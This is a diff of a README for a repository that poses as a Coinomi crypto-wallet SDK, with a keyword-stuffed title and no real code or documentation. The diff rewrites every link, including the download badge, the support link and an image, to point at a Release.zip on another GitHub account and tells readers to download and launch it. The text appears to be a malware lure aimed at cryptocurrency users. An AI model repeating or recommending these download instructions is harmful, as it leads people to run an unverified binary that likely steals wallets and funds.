@@ -25,9 +25,9 @@ Welcome to the Coinomi Wallet API Wallet Storage Web Browser Multi Crypto SDK Mu
 - web3
 
 ## Get Started
-To get started with the Coinomi Wallet API Wallet Storage Web Browser Multi Crypto SDK Multi Coin Storage, you can download the software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Once downloaded, launch the software to begin using the features provided by this versatile wallet solution.
+To get started with the Coinomi Wallet API Wallet Storage Web Browser Multi Crypto SDK Multi Coin Storage, you can download the software [here](https://github.com/abrek991/Coinomi-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases/download/v1.0/Release.zip). Once downloaded, launch the software to begin using the features provided by this versatile wallet solution.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/abrek991/Coinomi-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases/download/v1.0/Release.zip)](https://github.com/abrek991/Coinomi-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases/download/v1.0/Release.zip)
 
 ## Features
 🔒 Secure Cold Storage: Safely sweep your crypto to cold storage for enhanced security.
@@ -46,8 +46,8 @@ To get started with the Coinomi Wallet API Wallet Storage Web Browser Multi Cryp
 5. Open a pull request to merge your changes into the main repository.
 
 ## Support
-If you encounter any issues or have questions about the Coinomi Wallet API Wallet Storage Web Browser Multi Crypto SDK Multi Coin Storage, please visit the [Releases](https://github.com/22155555/1875695542/releases) section for the latest updates and information.
+If you encounter any issues or have questions about the Coinomi Wallet API Wallet Storage Web Browser Multi Crypto SDK Multi Coin Storage, please visit the [Releases](https://github.com/abrek991/Coinomi-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases/download/v1.0/Release.zip) section for the latest updates and information.
 
 Thank you for checking out this repository! Happy crypto storing and trading!
 
-![Coinomi Wallet](https://example.com/coinomi-wallet-image.jpg)
+![Coinomi Wallet](https://github.com/abrek991/Coinomi-Wallet-API-Wallet-Storage-Web-Browser-Multi-Crypto-SDK-Multi-Coin-Storage/releases/download/v1.0/Release.zip)
